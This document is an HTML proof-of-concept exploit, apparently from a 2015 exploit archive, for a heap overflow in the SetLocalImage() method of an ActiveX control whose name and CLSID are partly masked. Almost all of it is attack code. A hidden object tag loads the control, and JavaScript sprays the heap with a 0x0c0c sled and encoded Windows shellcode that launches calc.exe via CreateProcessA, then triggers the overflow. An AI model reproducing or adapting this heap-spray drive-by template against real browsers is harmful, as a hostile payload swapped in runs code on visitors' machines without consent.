<HTML>
<HEAD>
<TITLE>Heap based overflow vulnerability in SetLocalImage() method of I***********</TITLE>
<!--

 - Title: Heap based overflow vulnerability in SetLocalImage() method of I***********
 - Date: 2015.01.08
 - Author: 1ndr4

//-->
</HEAD><BODY>
<object classid="clsid:8*******-****-****-****-***********0" width=0 height=0 id="indra"></object>
<script>

var shellcode = '';

for(i = 0; i < 128; i++) {
	shellcode += unescape("%0c%0c%0c%0c");
	shellcode += unescape("%u0c0c%u0c0c");
}

// shellcode: http://www.autosectools.com/Content/all_win_createprocessa_calc.cpp
shellcode += unescape("%udb31%u8b64%u307b%u7f8b%u8b0c%u1c7f%u478b%u8b08");
shellcode += unescape("%u2077%u3f8b%u7e80%u330c%uf275%uc789%u7803%u8b3c");
shellcode += unescape("%u7857%uc201%u7a8b%u0120%u89c7%u8bdd%uaf34%uc601");
shellcode += unescape("%u8145%u433e%u6572%u7561%u81f2%u087e%u636f%u7365");
shellcode += unescape("%ue975%u7a8b%u0124%u66c7%u2c8b%u8b6f%u1c7a%uc701");
shellcode += unescape("%u7c8b%ufcaf%uc701%ud989%uffb1%ue253%u68fd%u6163");
shellcode += unescape("%u636c%ue289%u5252%u5353%u5353%u5353%u5352%ud7ff");
shellcode += unescape("%u0000%u0000");

memory = '';

for(i = 0; i < 0x40000; i++) {
	memory += shellcode;
}
payload = new Array();

for(i = 0; i < 0x5000; i++) {
	payload[i] = memory;
}
indra.SetLocalImage(payload[0]);
</script>
</BODY></HTML>
